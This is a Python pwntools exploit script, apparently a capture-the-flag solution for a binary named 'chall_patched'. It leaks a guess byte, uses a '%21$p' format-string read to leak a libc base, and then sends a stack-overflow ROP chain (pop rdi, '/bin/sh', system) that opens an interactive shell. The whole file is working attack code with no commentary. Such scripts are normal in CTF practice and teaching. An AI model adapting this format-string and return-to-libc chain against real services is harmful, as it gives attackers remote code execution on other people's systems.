from pwn import *

exe = context.binary = ELF("./chall_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-2.39.so")

gdbscript = '''
'''

pre_argv = []
post_argv = []


def get_conn(pre_argv, post_argv, gdbscript):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    cmd = pre_argv + [exe.path] + post_argv
    context.terminal = 'st'

    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(cmd)

    if args.GDB:
        gdb.attach(p)

    if args.DBG:
        p = gdb.debug(cmd, gdbscript=gdbscript)

    return p


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


p : tube = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: p.recv(*a, **k)
rl = lambda *a, **k: p.recvline(*a, **k)
ru = lambda *a, **k: p.recvuntil(*a, **k)
rr = lambda *a, **k: p.recvregex(*a, **k)
cl = lambda *a, **k: p.clean(*a, **k)
s = lambda *a, **k: p.send(*a, **k)
sa = lambda *a, **k: p.sendafter(*a, **k)
st = lambda *a, **k: p.sendthen(*a, **k)
sl = lambda *a, **k: p.sendline(*a, **k)
sla = lambda *a, **k: p.sendlineafter(*a, **k)
slt = lambda *a, **k: p.sendlinethen(*a, **k)
ia = lambda *a, **k: p.interactive(*a, **k)

ptr_protect = lambda pos, ptr: ptr ^ (pos >> 12)
ptr_mangle = lambda ptr, grd: rol(ptr ^ grd, 0x11)
ptr_demangle = lambda ptr, grd: ror(ptr, 0x11) ^ grd
i2b = lambda i: str(i).encode()


sla(b"> ", b"A" * 64)
ru(b"A" * 64)
guess = r(1)[0]
sla(b"honks?", i2b(guess))

sla(b"again?", b"%21$p")
ru(b"wow ")
libc_leak = int(ru(b" ", True), 16) - 0x93975
log.success(f"Libc leak: {libc_leak:#x}")
libc.address = libc_leak

pop_rdi = libc_leak + 0x10f75b
ret     = libc_leak + 0x10f75c
binsh   = next(libc.search(b"/bin/sh\0"))

payload = flat(
    b"A" * 0x178,
    pop_rdi,
    binsh,
    ret,
    libc.sym.system
)
sa(b"world?", payload)

ia()